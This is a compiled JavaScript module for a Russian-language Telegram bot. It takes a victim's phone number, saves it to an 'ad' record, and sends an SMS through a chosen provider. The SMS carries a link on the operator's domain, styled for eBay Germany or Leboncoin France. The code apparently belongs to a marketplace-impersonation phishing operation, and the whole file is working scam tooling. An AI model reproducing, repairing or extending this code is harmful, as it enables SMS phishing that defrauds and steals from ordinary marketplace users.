"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = exports.scene = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const database_1 = require("../../database");
const deleteAllMessages_1 = require("../../helpers/deleteAllMessages");
const sms_1 = require("../../utils/rassilka/sms");
const getDomen_1 = require("../../helpers/getDomen");
const getFlagEmoji_1 = require("../../helpers/getFlagEmoji");
exports.scene = new grammy_scenes_1.Scene('smsSend');
exports.composer = new grammy_1.Composer();
const regex = /sms ad (?<id>\d+)/gmi;
exports.composer.callbackQuery(regex, handler);
async function handler(ctx) {
    const match = regex.exec(ctx.callbackQuery.data);
    const id = match.groups.id;
    await ctx.scenes.enter('smsSend', {
        id
    });
}
async function cancel(ctx) {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
}
exports.scene.always().callbackQuery('cancel smsSend', cancel);
exports.scene.do(async (ctx) => {
    ctx.session.smsEmail = { ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: "1", who: undefined };
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const keyb = [
        [{ text: 'Hogwarts', callback_data: 'hogwarts' }],
    ];
    // if (ad.country.toLowerCase() === 'de') {
    //     keyb.push([{text: 'amnyam', callback_data: 'amnyam'}])
    // }
    await ctx.reply(`Выбери смсера`, {
        reply_markup: {
            inline_keyboard: keyb
        }
    });
    ctx.scene.resume();
});
exports.scene.wait().callbackQuery(/goose|hogwarts/gmi, async (ctx) => {
    ctx.session.smsEmail.smser = ctx.callbackQuery.data;
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    let text = undefined;
    if (ad.service.toLowerCase() === 'facebook' && ad.country.toLowerCase() === 'cz') {
        await ctx.reply(`СМС недоступен для Чехии(`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    if (ad.service.toLowerCase() === 'leboncoin' && ad.country.toLowerCase() === 'fr') {
        text = `📲 Введи номер телефона (🇫🇷+33):\n\n<b>Пример: +3315785425397</b>`;
        ctx.session.smsEmail.pattern = "fr";
        ctx.session.smsEmail.who = "leboncoin";
    }
    if (ad.service.toLowerCase() === 'ebay' && ad.country.toLowerCase() === 'de') {
        text = `📲 Введи номер телефона (${((0, getFlagEmoji_1.getFlagEmoji)('de'))}+49):\n\n<b>Пример: +4915785425397</b>`;
        ctx.session.smsEmail.pattern = "de";
        ctx.session.smsEmail.who = "ebay";
    }
    const msg = await ctx.reply(text, {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel smsSend')
    });
    ctx.session.deleteMessage = [];
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on('message:text', async (ctx) => {
    ctx.session.smsEmail.to = ctx.msg.text;
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    ad.phone = ctx.session.smsEmail.to;
    await database_1.adsRepository.save(ad);
    const domen = await (0, getDomen_1.getDomen)(ctx.user, ad.service);
    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    let response = undefined;
    response = await (0, sms_1.sendSms)(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, ctx.session.smsEmail.who, `https://${domen.link}/link/${ad.link}?phone=goose`, ctx.from.id);
    const msg = await ctx.reply(`⏳`);
    try {
        await ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
    }
    catch (e) { }
    await ctx.reply((response?.data?.status === "true")
        ? `✅ Отправлено`
        : `⚠️ Не удалось отправить смс`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
            ]
        }
    });
    return cancel(ctx);
});
